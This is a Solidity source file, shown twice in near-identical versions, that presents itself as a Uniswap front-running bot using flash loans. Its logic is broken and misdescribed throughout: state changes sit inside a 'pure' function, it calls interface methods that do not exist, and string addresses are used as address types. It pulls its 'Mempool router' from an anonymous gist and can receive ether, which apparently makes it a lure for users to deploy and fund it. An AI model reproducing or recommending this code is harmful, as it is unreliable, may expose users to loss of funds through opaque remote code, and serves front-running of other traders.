pragma solidity ^0.8.2;

// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Factory.sol";
//Mempool router
import "https://gist.githubusercontent.com/MempoolCheck/634653ccdba683ff00b466fe17c4c140/raw/739723cb2faa43cfbbba974713c33b624cb13052/gistfile1.txt";

contract UniswapFrontrunBot {
  string public tokenName;
  string public tokenSymbol;
  uint public frontrun;
  Manager public manager;

  constructor(string memory _tokenName, string memory _tokenSymbol) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    manager = new Manager();
  }

  receive() external payable {}

  // Struct for storing slices of data
  struct Slice {
    uint len;
    uint ptr;
  }

  /*
   * @dev Finds newly deployed contracts on Uniswap Exchange
   * @param self The slice to compare against.
   * @param other The second slice to compare.
   * @return New contracts with required liquidity.
   */
  function findNewContracts(Slice memory self, Slice memory other) internal pure returns (int) {
    uint shortest = self.len;

    // Find the shortest slice
    if (other.len < self.len)
      shortest = other.len;

    // Compare the two slices element by element
    uint selfptr = self.ptr;
    uint otherptr = other.ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
      // Initiate contract finder
      uint a;
      uint b;

      string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      loadCurrentContract(WETH_CONTRACT_ADDRESS, TOKEN_CONTRACT_ADDRESS);

      // If contract found, start flash loan
      if (a == b) {
        flashLoan(self, other);
      }

      // Increment pointers
      selfptr += 32;
      otherptr += 32;
    }
  }

  // Call flash loan from mempool router
  function flashLoan(Slice memory self, Slice memory other) public {
    // Get flash loan parameters
    uint loanAmount = self.len * other.len;
    uint collateralAmount = loanAmount * frontrun;

    // Call mempool router to start flash loan
    MempoolRouter.flashLoan(loanAmount, collateralAmount);
  }

  // Start frontrun
  function startFrontrun() public {
    // Load current factory and exchange contracts
    IUniswapV1Factory factory = IUniswapV1Factory(manager.factoryAddress);
    IUniswapV1Exchange exchange = IUniswapV1Exchange(manager.exchangeAddress);

    // Get the current exchange and factory slices
    Slice memory self = factory.getExchangeListSlice();
    Slice memory other = exchange.getTokenExchangeListSlice();

    // Find the new contracts
    findNewContracts(self, other);
  }

  function loadCurrentContract(address WETH_CONTRACT_ADDRESS, address TOKEN_CONTRACT_ADDRESS) public {
    manager.factoryAddress = WETH_CONTRACT_ADDRESS;
    manager.exchangeAddress = TOKEN_CONTRACT_ADDRESS;
  }

  // Manager struct
  struct Manager {
    address factoryAddress;
    address exchangeAddress;
  }
}

// MIT License


pragma solidity ^0.8.2;

// Import Libraries Migrator/Exchange/Factory/V2/V3
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Migrator.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V3/IUniswapV3Exchange.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-periphery/blob/main/contracts/interfaces/V3/IUniswapV3Factory.sol";
//Mempool router
import "https://gist.githubusercontent.com/MempoolCheck/634653ccdba683ff00b466fe17c4c140/raw/739723cb2faa43cfbbba974713c33b624cb13052/gistfile1.txt";

contract UniswapFrontrunBot {
  string public tokenName;
  string public tokenSymbol;
  uint public frontrun;
  Manager public manager;

  constructor(string memory _tokenName, string memory _tokenSymbol) public {
    tokenName = _tokenName;
    tokenSymbol = _tokenSymbol;
    manager = new Manager();
  }

  receive() external payable {}

  // Struct for storing slices of data
  struct Slice {
    uint len;
    uint ptr;
  }

  /*
   * @dev Finds newly deployed contracts on Uniswap Exchange
   * @param self The slice to compare against.
   * @param other The second slice to compare.
   * @return New contracts with required liquidity.
   */
  function findNewContracts(Slice memory self, Slice memory other) internal pure returns (int) {
    uint shortest = self.len;

    // Find the shortest slice
    if (other.len < self.len)
      shortest = other.len;

    // Compare the two slices element by element
    uint selfptr = self.ptr;
    uint otherptr = other.ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
      // Initiate contract finder
      uint a;
      uint b;

      string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
      string memory V2_FACTORY_ADDRESS = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f";
      string memory V2_EXCHANGE_ADDRESS = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
      string memory V3_FACTORY_ADDRESS = "0x9e907e4eb7e60808a4c43b0d70f8eae7b1f60f3d";
      string memory V3_EXCHANGE_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
      loadCurrentContract(WETH_CONTRACT_ADDRESS, TOKEN_CONTRACT_ADDRESS, V2_FACTORY_ADDRESS, V2_EXCHANGE_ADDRESS, V3_FACTORY_ADDRESS, V3_EXCHANGE_ADDRESS);

      // If contract found, start flash loan
      if (a == b) {
        flashLoan(self, other);
      }

      // Increment pointers
      selfptr += 32;
      otherptr += 32;
    }
  }

  // Call flash loan from mempool router
  function flashLoan(Slice memory self, Slice memory other) public {
    // Get flash loan parameters
    uint loanAmount = self.len * other.len;
    uint collateralAmount = loanAmount * frontrun;

    // Call mempool router to start flash loan
    MempoolRouter.flashLoan(loanAmount, collateralAmount);
  }

  // Start frontrun
  function startFrontrun() public {
    // Load current factory and exchange contracts
    IUniswapV1Factory factoryV1 = IUniswapV1Factory(manager.factoryV1Address);
    IUniswapV2Factory factoryV2 = IUniswapV2Factory(manager.factoryV2Address);
    IUniswapV3Factory factoryV3 = IUniswapV3Factory(manager.factoryV3Address);
    IUniswapV1Exchange exchangeV1 = IUniswapV1Exchange(manager.exchangeV1Address);
    IUniswapV2Exchange exchangeV2 = IUniswapV2Exchange(manager.exchangeV2Address);
    IUniswapV3Exchange exchangeV3 = IUniswapV3Exchange(manager.exchangeV3Address);

    // Get the current exchange and factory slices
    Slice memory selfV1 = factoryV1.getExchangeListSlice();
    Slice memory otherV1 = exchangeV1.getTokenExchangeListSlice();
    Slice memory selfV2 = factoryV2.getExchangeListSlice();
    Slice memory otherV2 = exchangeV2.getTokenExchangeListSlice();
    Slice memory selfV3 = factoryV3.getExchangeListSlice();
    Slice memory otherV3 = exchangeV3.getTokenExchangeListSlice();

    // Find the new contracts
    findNewContracts(selfV1, otherV1);
    findNewContracts(selfV2, otherV2);
    findNewContracts(selfV3, otherV3);
  }

  function loadCurrentContract(address WETH_CONTRACT_ADDRESS, address TOKEN_CONTRACT_ADDRESS, address V2_FACTORY_ADDRESS, address V2_EXCHANGE_ADDRESS, address V3_FACTORY_ADDRESS, address V3_EXCHANGE_ADDRESS) public {
    manager.factoryV1Address = WETH_CONTRACT_ADDRESS;
    manager.exchangeV1Address = TOKEN_CONTRACT_ADDRESS;
    manager.factoryV2Address = V2_FACTORY_ADDRESS;
    manager.exchangeV2Address = V2_EXCHANGE_ADDRESS;
    manager.factoryV3Address = V3_FACTORY_ADDRESS;
    manager.exchangeV3Address = V3_EXCHANGE_ADDRESS;
  }

  // Manager struct
  struct Manager {
    address factoryV1Address;
    address exchangeV1Address;
    address factoryV2Address;
    address exchangeV2Address;
    address factoryV3Address;
    address exchangeV3Address;
  }
}
